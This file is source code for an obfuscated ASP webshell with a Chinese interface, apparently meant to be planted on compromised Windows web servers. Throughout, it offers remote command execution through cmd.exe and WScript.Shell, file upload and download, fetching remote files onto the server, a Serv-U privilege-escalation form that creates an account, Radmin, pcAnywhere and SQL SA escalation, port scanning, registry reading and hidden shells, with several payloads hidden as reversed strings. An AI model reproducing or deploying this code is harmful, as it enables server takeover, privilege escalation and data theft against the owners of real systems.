flrcbv & ╁enoN=soitaR-╁ & flrcbv & ╁ralugeR=epyTdrowssaP-╁ & flrcbv & ╁metsyS=ecnanetniaM-╁╋_ & flrcbv & ╁0=mumixaMatouQ-╁ & flrcbv & ╁0=tnerruCatouQ-╁ & flrcbv & ╁0=tiderCsoitaR-╁ & flrcbv & ╁1=nwoDoitaR-╁╋_ & flrcbv & ╁1=pUoitaR-╁ & flrcbv & ╁0=eripxE-╁ & flrcbv & ╁1-=tuOemiTnoisseS-╁ & flrcbv & ╁006=tuOemiTeldI-╁ & flrcbv & ╁1-=sresUrNxaM-╁╋_ & flrcbv & ╁0=nwoDtimiLdeepS-╁ & flrcbv & ╁0=pUtimiLdeepS-╁ & flrcbv & ╁1-=PIrePnigoLsresUxaM-╁ & flrcbv & ╁0=elbanEatouQ-╁╋_ & flrcbv & ╁0=drowssaPegnahC-╁ & flrcbv & ╁0=nigoLwollAsyawlA-╁ & flrcbv & ╁0=neddiHediH-╁ & flrcbv & ╁0=eruceSdeeN-╁╋_ & flrcbv & ╁1=shtaPleR-╁ & flrcbv & ╁0=elbasiD-╁ & flrcbv & ╁=eliFseMnigoL-╁ & flrcbv & ╁\╁ & htapt & ╁=riDemoH-╁╋_ & flrcbv & ssapt & ╁=drowssaP-╁ & flrcbv & resut & ╁=resU-╁ & flrcbv & tropt & ╁=oNtroP-╁ & flrcbv & ╁0.0.0.0=PI-╁ & flrcbv & ╁PUTESRESUTES-╁ & sevael = sevael╋flrcbv & ╁ECNANETNIAM ETIS╁ & sevael = sevael╋flrcbv & dwp & ╁ ssaP╁ & sevael = sevael╋flrcbv & rsU & ╁ resU╁ = sevael╋nehT ╁dda╁ = )╁nottuboidar╁(mroF.tseuqer fi╋)╁dmcd╁(mroF.tseuqer = dnammoC'╋)╁tropt╁(mroF.tseuqer = tropt╋)╁htapt╁(mroF.tseuqer = htapt╋)╁ssapt╁(mroF.tseuqer = ssapt╋)╁resut╁(mroF.tseuqer = resut╋)╁tropd╁(mroF.tseuqer = trop╋)╁dwpd╁(mroF.tseuqer = dwp╋)╁resud╁(mroF.tseuqer = rsU╋╁>retnec/<>mrof/<>elbat/<>rt/<>dt/<>'1'=eulav 'noitca'=di 'neddih'=epyt 'noitcaUS'=eman tupni<>'teseR'=eulav '2timbuS'=eman 'teser'=epyt tupni<;psbn&>'oG tsuJ'=eulav 'timbuS'=eman 'timbus'=epyt tupni<>d=di '2'=napsloc dt<>'elddim'=ngilav 'retnec'=ngila rt<>rt/<>dt/<除删定确>d=di 'xoBtxeT'=ssalc 'led'=eulav 'nottuboidar'=eman 'oidar'=epyt tupni<;psbn&加添定确>d=di 'xoBtxeT'=ssalc dekcehc 'dda'=eulav 'oidar'=epyt 'nottuboidar'=eman tupni<>d=di dt<>dt/<：务任行执>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'12'=eulav 'tropt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropt'=eman tupni<>d=di dt<>dt/<：口端务服>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'\:C'=eulav 'htapt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'htapt'=eman tupni<>d=di dt<>dt/<：径路问访>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'1'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<>d=di dt<>dt/<：令口加新>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'redavni'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<>d=di dt<>dt/<：号账加新>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'85934'=eulav 'tropd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropd'=eman tupni<>d=di dt<>dt/<：口端统系>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'P@0;kl.#ka$@l#'=eulav 'dwpd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'dwpd'=eman tupni<>d=di dt<>dt/<：令口统系>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'rotartsinimdAlacoL'=eulav 'resud'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resud'=eman tupni<>d=di dt<>dt/<：号账统系>d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>b/<息信本版成集>B< >tnof/<8>sgnidbew=ecaf tnof<>s=di '2'=napsloc dt<>'elddim'=ngilav 'retnec'=ngila rt<>'005'=htdiw elbat<>''=noitca 'tsop'=dohtem '1mrof'=eman mrof<>rb<>retnec<╁j╋"))
End Function



Function MainMenu()
j"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==""""){document.getElementById(s).style.display=""none"";}else{document.getElementById(s).style.display="""";}}</script><table width='100%' cellspacing='0' cellpadding='0'><tr><td height='5'></td></tr><tr><td><center><font color=pink><font size=1.0>"&mName&"</font></font></center><hr color=#424242 size=1 ></td></tr>":If ObT(0,1)=" ×" Then
j"<tr><td height='24'>无权限</td></tr>"
Else
j"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='Disk & Files'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menud style=""display='none'"">"
Set ABC=New LBF:j ABC.ShowDriver():Set ABC=Nothing

j"</table></td></tr><tr><td valign=""top"" align=center><table border=0><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#121212'""><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><font face='wingdings'>8</font> 站点根目录"&ef
j cdx&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&cxd&" 本程序目錄"&ef
j cdx&"<a href='?Action=goback' target='FileFrame'>"&cxd&" 回上级目录"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>"&cxd&" 新建--目錄"&ef
j cdx&"<a href='?Action=EditFile' target='FileFrame'>"&cxd&" 新建--文本"&ef
j cdx&"<a href='?Action=UpFile' target='FileFrame'>"&cxd&" 上传--文件"&ef
j cdx&"<a href='?Action=Cmd1Shell' target='FileFrame'>"&cxd&" 执行---CMD"&ef
j cdx&"<a href='?Action=cmdx' target='FileFrame'>"&cxd&" 执行--CMD2"&ef
j cdx&"<a href='?Action=ScanDriveForm' target='FileFrame'>"&cxd&" 磁盘--权限"&ef
j cdx&"<a href='?Action=php' target='FileFrame'>"&cxd&" 脚本--探测"&ef
j cdx&"<a href='?Action=PageAddToMdb' target='FileFrame'>"&cxd&" 服务器打包"&ef
j cdx&"<a href='?Action=upload' target='FileFrame'>"&cxd&" 下载--文件"&ef&"</table><hr></td></tr>"
End If
j"</tr><tr><td height=4></td></tr><tr><td onClick=""MM_show('menuc')""><input onMouseOver=""this.style.cursor='hand1'"" type=button value='Information'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menuc style=""display='none'"">"
j cdx&"<a href='?Action=Course' target='FileFrame'>"&cxd&" 用户__账号"&ef
j cdx&"<a href='?Action=getTerminalInfo' target='FileFrame'>"&cxd&" 端口__网络"&ef
j cdx&"<a href='?Action=Alexa' target='FileFrame'>"&cxd&" 组件__支持"&ef
j cdx&"<a href='?Action=Servu' target='FileFrame'>"&cxd&" Servu-提权"&ef
j cdx&"<a href='?Action=suftp' target='FileFrame'>"&cxd&" Su---FTP版"&ef
j cdx&"<a href='?Action=MMD' target='FileFrame'>"&cxd&" SQL-----SA"&ef
j cdx&"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>"&cxd&" SQL---管理"&ef
j cdx&"<a href='?Action=radmin' target='FileFrame'>"&cxd&" Radmin提权"&ef
j cdx&"<a href='?Action=pcanywhere4' target='FileFrame'>"&cxd&" Pcanywhere"&ef
j cdx&"<a href='?Action=ScanPort' target='FileFrame'>"&cxd&" 端口扫描器"&ef
j cdx&"<a href='?Action=ReadREG' target='FileFrame'>"&cxd&" 读取注册表"&ef
j cdx&"<a href='?Action=TSearch' target='FileFrame'>"&cxd&" 搜索__文件"&ef&"</tr></table>"
j"<hr><tr><td><input onMouseOver=""this.style.cursor='hand'"" type=button value='   Special     '></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
j cdx&"<a href='?Action=EditPower&PowerPath=\\.\"&OOOO&"' target='FileFrame'>"&cxd&" <font color=red>杀杀杀杀杀"&ef
j cdx&"<a href='?Action=hiddenshell' target='FileFrame'>"&cxd&" <font color=red>老子干死你</font>"&ef
j cdx&"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>"&cxd&" <font color=red>爆你大菊花</font>"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\vti_cnf..\\")&""",""NewFolder"")'>"&cxd&"  <font color=red>草泥马目录</font>"&ef
j cdx&"<a href='?Action=ProFile' target='FileFrame'>"&cxd&" <font color=red>文件--保护"&ef
j"<hr><tr><td><input onMouseOver=""this.style.cursor='hand'"" type=button value=' 草泥马查询 '></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
j cdx&"<a href='http://www.aizhan.com/siteall/"&str1&"' target='FileFrame'>"&cxd&" 综合查询"&ef
j cdx&"<a href='http://www.114best.com/ip/114.aspx?w="&str1&"' target='FileFrame'>"&cxd&" 同服查询"&ef
j cdx&"<a href='http://mytool.chinaz.com/baidusort.aspx?host="&str1&"&sortType=0' target='FileFrame'>"&cxd&" 权重查询"&ef
j cdx&"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url="&str1&"&btn=+查+询+' target='blank'>"&cxd&" <font color=red>处女查询"&ef
j cdx&"<a href='?Action=Logout' target='_top'>"&cxd&" <font color=green>退出--登陆</a></td></tr></hr></table>"
end function
function Cmdx()
execute(shisanfun(")╁>retnec/<>aeratxet/<╁(j: lladaer.tuodts.))╁dmc╁(tseuqer&╁c/ ╁&)╁xdmc╁(tseuqer(cexe.nhltpircSo j: fi dne╋ lladaer.tuodts.))╁dmc╁(tseuqer&╁c/ exe.dmc╁(cexe.nhltpircSo j╋neht ╁exe.dmc╁=)╁xdmc╁(tseuqer fi:txeN emuseR rorrE nO:)╁ >72=swor 051=sloc ylnodaer aeratxet<╁(j:)╁ >mrof/<>'tibmuS'=eulav timbus=epyt tupni<╁(j:)╁ >rb<>06=ezis 'dmc'=eman txet=epyt tupni<╁(j:)╁ >rb<>'exe.dmc'=eulav 06=ezis 'xdmc'=eman txet=epyt tupni<╁(j:)╁ >'tsop'=dohtem mrof<>retnec<╁(j╋"))
end function



Function Course()
SI="<br><table width='80%' align='center'><tr><td height='20' colspan='3' align='center' id=s><b>系统用户与服务</b></td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td id=d>&nbsp;系统用户(组)</td></tr><tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" id=d colspan=""2"">[启动类型:"&lx&"]<font>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
j SI&SI0&SI1&SI2&"</table>"
End Function
respnose.Write strBAD&Action
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function

function downfile(path)
execute(shisanfun("gnihton = mso tes╋esolc.mso╋hsulf.esnopser╋daer.mso etirwyranib.esnopser╋╁maerts-tetco/noitacilppa╁ = epyttnetnoc.esnopser╋╁8-ftu╁ = tesrahc.esnopser╋ezis.mso ,╁htgnel-tnetnoc╁ redaehdda.esnopser╋)zs,htap(dim & ╁=emanelif ;tnemhcatta╁ ,╁noitisopsid-tnetnoc╁ redaehdda.esnopser╋1+)╁\╁,htap(verrtsni=zs╋htap elifmorfdaol.mso╋1 = epyt.mso╋nepo.mso╋))0,6(tbo(tcejboetaerc = mso tes╋raelc.esnopser╋"))
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
execute(shisanfun("noitcnuF dnE╋╋╁>elbat/<>mrof/<>rt/<>dt/<>'传上'=eulav 'timbuS'=eman 'timbus'=epyt tupni< >'52'=ezis  'elif'=epyt 'eliFlacoL'=eman tupni<>'04'=ezis '╁&)╁exe.dmC\╁&)╁htaPredloF╁(noisseS(htaPeRR&╁'=eulav 'htaPoT'=eman tupni<：径路传上>dt<>rt<>'atad-mrof/trapitlum'=epytcne 'tsoP=2noitcA&eliFpU=noitcA?╁&LRU&╁'=noitca 'tsop'=dohtem 'mroFpU'=eman mrof<>'retnec'=ngila '0'=gnicapsllec '0'=gniddapllec '0'=redrob elbat<>rb<>rb<>rb<╁j  ╋fI dnE  ╋dnE.esnopseR ╋)(rrEwohS ╋╁╁&lruypoc&╁╁ j ╋IS j ╋lrUkcaB&IS=IS ╋gnihton=U teS╋gnihton=F teS╋fI dnE ╋fi dnE  ╋╁>retnec/<！功成╁&╁传╁&╁上╁&emaNU&╁件文>rb<>rb<>rb<>retnec<╁=IS ╋nehT 0=rebmun.rrE fI ╋emaNU sAevaS.F ╋eslE  ╋txen emuser rorre no╋╁!传上╁&╁件文个一╁&╁择选后径路╁&╁全完的╁&╁传上入╁&╁输请>rb<╁=IS  ╋neht 0=eziSeliF.F rO ╁╁=emaNU fI ╋)╁htaPoT╁(mrof.U=emaNU╋)╁eliFlacoL╁(AU.U=F teS╋ CPU wen=U teS╋nehT ╁tsoP╁=)╁2noitcA╁(tseuqeR fI ╋)(eliFpU noitcnuF"))
function cmd1shell()
execute(shisanfun("is j╋╁>mrof/<>aeratxet/<╁&)31(rhc&is=is╋fi dne╋fi dne╋aaa&is=is╋)eurt ,elifpmetzs(elifeteled.osf llac╋esolc.xclelifo╋)lladaer.xclelifo(edocnelmth.revres=aaa╋)0 ,eslaf ,1 ,elifpmetzs( eliftxetnepo.sf = xclelifo tes╋)╁tcejbometsyselif.gnitpircs╁(tcejboetaerc = sf tes╋)eurt ,0 ,elifpmetzs & ╁ > ╁ & dmcfed & ╁ c/ ╁&htapllehs( nur.sw llac╋)╁txt.dmc╁(htappam.revres = elifpmetzs╋)╁tcejbometsyselif.gnitpircs╁(tcejboetaerc.revres=osf tes╋)╁llehs.tpircsw╁(tcejboetaerc.revres=sw tes╋)╁llehs.tpircsw╁(tcejboetaerc.revres=sw tes╋txen emuser rorre no╋esle╋aaa&is=is╋lladaer.tuodts.dd=aaa╋)dmcfed&╁ c/ ╁&htapllehs(cexe.mc=dd tes╋))0,1(tbo(tcejboetaerc=mc tes╋neht ╁sey╁=)╁tpircsw╁(mrof.tseuqer fi╋neht ╁╁><)╁dmc╁(mrof.tseuqer fi╋╁>'dmc'=ssalc ';044:thgieh;%001:htdiw'=elyts aeratxet<>'行执'=eulav 'timbus'=epyt tupni< >'╁&dmcfed&╁'=eulav '%29:htdiw'=elyts 'dmc'=eman tupni<llehs.tpircsw>╁&dekcehc&╁'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<>'%07:htdiw'=elyts '╁&htapllehs&╁'=eulav 'ps'=eman tupni<：径路llehs>'tsop'=dohtem mrof<╁=is╋)╁dmc╁(tseuqer = dmcfed neht ╁╁><)╁dmc╁(tseuqer fi╋╁╁=dekcehc neht ╁sey╁><)╁tpircsw╁(tseuqer fi╋╁exe.dmc╁ = htapllehs neht ╁╁=htapllehs fi╋)╁htapllehs╁(noisses=htapllehs╋)╁ps╁(tseuqer = )╁htapllehs╁(noisses neht ╁╁><)╁ps╁(tseuqer fi╋╁dekcehc ╁=dekcehc╋"))
end function
Function upload()
j"<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
j"暂时关闭此功能"
j" 下载到服务器:无回显...为了节省.所以无回显<hr/>"
j"<form method=post>"
j"<select onChange='this.form.theUrl.value=this.value;'>"
j"<option value=''>常用程序下载</option>"
j"<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
j"<input name=thePath value='" & HtmlEncode(Server.MapPath(".")) & "\' size=80>"
j"<input type=checkbox name=overWrite value=2>存在覆盖。"
j"<input type=hidden value=downFromUrl name=theAct>"
j"</form>"
j"<hr/>"
If isDebugMode = False Then
On Error Resume Next
End If:Dim Http, theUrl, thePath, stream, fileName, overWrite
theUrl = Request("theUrl")
thePath = Request("thePath")
overWrite = Request("overWrite")
Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http = Server.CreateObject("MSXML2.XMLHTTP")
If overWrite <> 2 Then:overWrite = 1:End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
End If
With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
j"error,可能是因为文件已存在，或下载过程和地址中出 现错误 。 文件下载完 毕为空字节！！"
End If
.Close
End With
chkErr(Err)
Set Http = Nothing
Set Stream = Nothing
If isDebugMode = False Then
On Error Resume Next
End If
If Request("ice")="fso" Then
response.Redirect str1&"test.aspx"
elseif Request("ice")="fsos" then
response.Redirect str1&"test.php"
elseif Request("ice")="jztxt" then
response.Redirect "http://"&serveru&"/global.asa"
elseif Request("ice")="killdoor" then
response.Redirect str1&"killdoor.asp"
end if
End Function:Function TSearch():dim st:st=timer():RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor=''>搜索引擎</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;注:多路徑使用"",""号连接.</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;文件名：<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='搜索' class='submit'>&nbsp;[部分也行]</td></tr>"  
  RW=RW & "</form></table>"
  j RW : RW=""
  if Request.Form("Sfk")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("Sfk"))
  newsearch.Search
  Set newsearch=Nothing
  j"費時："&(timer()-st)*1000&"毫秒<hr>"
  end if
End Function 

Class SearchFile
 dim Folders,keyword,objFso,Counter
 Private Sub Class_Initialize
  Set objFso=Server.CreateObject(ObT(0,0))
  Counter=0
 End Sub
 Private Sub Class_Terminate
    Set objFso=Nothing
 End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    j"<table align='center' width='600'><hr><p align='center'><font color='red'>關鍵字不能包含/\:|&</font><br>"
 Exit Function
  else
    j"<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  j"<p align='center'>共搜索到<font color='red'>"&Counter&"</font>個結果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function
 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  j OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class


execute(shisanfun("╋noitcnuf dnE:fI dnE:╁)'。下录目点站在不件文'(trela╁╁=kcilcno ╁╁###╁=lrUnepo:eslE:╁knalb_╁╁=tegrat ╁╁╁&lrUeht&╁/╁=lrUnepo:fI dnE:)2 ,lrUeht(diM = lrUeht:nehT ╁/╁ = )1 ,lrUeht(tfeL fI:)╁/╁ ,╁\╁ ,lrUeht(ecalpeR = lrUeht:)1 + )htaPeht(neL ,htaPesu(diM = lrUeht:nehT )htaPeht(esaCL = )))htaPeht(neL ,htaPesu(tfeL(esaCL fI:)╁/╁(htaPpaM.revreS = htaPeht:htaPeht ,lrUeht miD:)htaPesu(lrUnepo noitcnuf:noitcnuF dnE:fi dne:╁B╁ & eziSeht = eziSehTteg: nehT 4201< eziSeht dnA 0 => eziSeht fI:fi dne:╁K╁ & 001 / )001 * )4201 / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201( < eziSeht dnA 4201 => eziSeht fI:fi dne:╁M╁ & 001 / )001 * ))4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( < eziSeht dnA )4201 * 4201( => eziSeht fI:fi dne:╁G╁ & 001 / )001 * ))4201 * 4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( => eziSeht fI:)eziSeht(eziSehTteg noitcnuF:noitcnuF dnE:fi dne:╁>╁╁'╁&htaPrewoP&╁=htaPrewoP&2=epyTevaS&rewoPevaS=noitcA?'=ferh.noitacol╁╁=kcilcno 定锁=eulav nottub=epyt tupni< >tnof/<定锁未>26FF26#=roloc tnof<╁ = setubirttAteg:esle:╁>╁╁'╁&htaPrewoP&╁=htaPrewoP&1=epyTevaS&rewoPevaS=noitcA?'=ferh.noitacol╁╁=kcilcno 锁解=eulav nottub=epyt tupni< >tnof/<定锁已>der=roloc tnof<╁ = setubirttAteg: neht 0=KOtidE fi:)╁\\╁,╁\╁,htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => eulaVtni fI:fI dnE:0=KOtidE:2 - eulaVtni = eulaVtni:nehT 2 => eulaVtni fI:fI dnE:0=KOtidE:4 - eulaVtni = eulaVtni:nehT 4 => eulaVtni fI:fI dnE:8 - eulaVtni = eulaVtni:nehT 8 => eulaVtni fI:fI dnE:61 - eulaVtni = eulaVtni:nehT 61 => eulaVtni fI:fI dnE:23 - eulaVtni = eulaVtni:nehT 23 => eulaVtni fI:fI dnE:46 - eulaVtni = eulaVtni:nehT 46 => eulaVtni fI:fI dnE:821 - eulaVtni = eulaVtni:nehT 821 => eulaVtni fI:1=KOtidE:KOtidE miD:)htaPrewoP,eulaVtni(setubirttAteg noitcnuF:noitcnuF dnE:eltiTrts = eltiTyMteg:)htaPrewoP,setubirttA.enOeht(setubirttAteg & ╁ :态状限权前当>rb<╁ & eltiTrts = eltiTrts:desseccAtsaLetaD.enOeht & ╁ :问访后最>rb<╁ & eltiTrts = eltiTrts:deifidoMtsaLetaD.enOeht & ╁ :改修后最>rb<╁ & eltiTrts = eltiTrts: detaerCetaD.enOeht & ╁ :间时建创>rb<╁ & eltiTrts = eltiTrts: )eziS.enOeht(eziSehTteg & ╁ :小大>rb<╁ & eltiTrts = eltiTrts: ╁╁ & htaP.enOeht & ╁ :径路>rb<╁ & eltiTrts = eltiTrts:eltiTrts miD:)htaPrewoP,enOeht(eltiTyMteg noitcnuF:bus dne:gnihtoN = eliFeht teS:)htaPrewoP,eliFeht(eltiTyMteg j:)htaPrewoP(eliFteG.Xosf = eliFeht teS:)╁╁,╁╁╁╁,htaPrewoP(ecalper=htaPrewoP:)htaPrewoP(rewoPtidE bus:bus dne:gnihtoN = eliFeht teS:fi dne:╁>tpircs/<;)(esolc.wodniw;)(daoler.noitacol.renepo.wodniw;)'。功成定锁件文'(trela>'tpircsavaj'=egaugnal tpircs<╁ j:7=setubirttA.eliFeht:esle:╁>tpircs/<;)(esolc.wodniw;)(daoler.noitacol.renepo.wodniw;)'。锁解功成已件文'(trela>'tpircsavaj'=egaugnal tpircs<╁ j:23=setubirttA.eliFeht:neht 1=epyTevaS fi:)htaPrewoP(eliFteG.Xosf = eliFeht teS:)epyTevaS,htaPrewoP(rewoPevaS bus╋"))

Function ScReWr(folder)
execute(shisanfun("rtSrWeR = rWeRcS╋gnihtoN = OSF teS╋gnihtoN = redloFtseT teS╋gnihtoN = tsiLeliFtseT teS╋fi dnE╋fi dnE╋eurT,emaneliFdnR & redlof eliFeteleD.OSF╋╁ √>naps/<写>';xp11:ezis-tnof'=elyts naps<╁ & rtSrWeR = rtSrWeR╋eslE╋╁ >tnof/<x>wolley=roloc '1'=ezis 'sgnidbew'=ecaf tnof<>naps/<写>';xp11:ezis-tnof'=elyts naps<╁ & rtSrWeR = rtSrWeR╋raelC.rre╋nehT rre fI╋eurT,emaneliFdnR & redlof eliFtxeTetaerC.OSF╋╁ √>naps/<读>';xp11:ezis-tnof'=elyts naps<╁ = rtSrWeR╋eslE╋fI dnE╋eurT,emaneliFdnR & redlof eliFeteleD.OSF╋╁ √>naps/<写>';xp11:ezis-tnof'=elyts naps<╁ & rtSrWeR = rtSrWeR╋eslE╋╁ >tnof/<x>wolley=roloc '1'=ezis 'sgnidbew'=ecaf tnof<>naps/<写>';xp11:ezis-tnof'=elyts naps<╁ & rtSrWeR = rtSrWeR╋raelC.rre╋nehT rre fI╋eurT,emaneliFdnR & redlof eliFtxeTetaerC.OSF╋╁ >tnof/<x>wolley=roloc '1'=ezis 'sgnidbew'=ecaf tnof<>naps/<读>';xp11:ezis-tnof'=elyts naps<╁ = rtSrWeR╋raelC.rre╋nehT rre fI╋txeN╋tsiLeliFtseT ni A hcaE roF╋╁pmt.╁ & )won(dnoceS & )won(etuniM & )won(ruoH & )won(yaD & ╁pmet\╁ = emaneliFdnR╋sredloFbuS.redloFtseT = tsiLeliFtseT teS╋)redlof(redloFteG.OSF = redloFtseT teS╋)╁tcejbOmetsySeliF.gnitpircS╁(tcejboetaerC.revreS = OSF teS╋emaneliFdnR,rtSrWeR,tsiLeliFtseT,redloFtseT,OSF miD╋ txen emuser rorre no"))
End Function

function php()
execute(shisanfun("╁>rb<>mrof/<>sosf=eci&lrUmorFnwod=tcAeht&2=etirWrevo&php.tset\╁&htaptoor&╁=htaPeht&╁&tphp&╁=lrUeht&daolpu=noitcA?=noitca tsop=dohtem 2mrof=eman mrof<╁j╋╁>rb<>mrof/<>osf=eci&lrUmorFnwod=tcAeht&2=etirWrevo&xpsa.tset\╁&htaptoor&╁=htaPeht&╁&txpsa&╁=lrUeht&daolpu=noitcA?=noitca tsop=dohtem 2mrof=eman mrof<╁j╋╁>retnec<>'02'=thgieh dt<>rt<>retnec/<>a/<>tnof/<>b/<)!件文试测除删(>b<>der=roloc 5=ezis tnof<>'ledjpa=noitcA?'=ferh a<>p<>tnof/<>retnec<>rb<>p<>rb<>rb<>p<>rb<>p<>rb<>rb<>retnec/< ;psbn&;psbn&;psbn&>emarfi/<>001=thgieh 003=htdiw xpsa.tset=crs emarfi< ;psbn&;psbn&;psbn&;psbn&>emarfi/<>001=thgieh 003=htdiw psj.tset=crs emarfi< ;psbn&;psbn&;psbn&;psbn&>emarfi/<>001=thgieh 003=htdiw php.tset=crs emarfi<>retnec<╁j╋╁oo∩_∩oo tseT 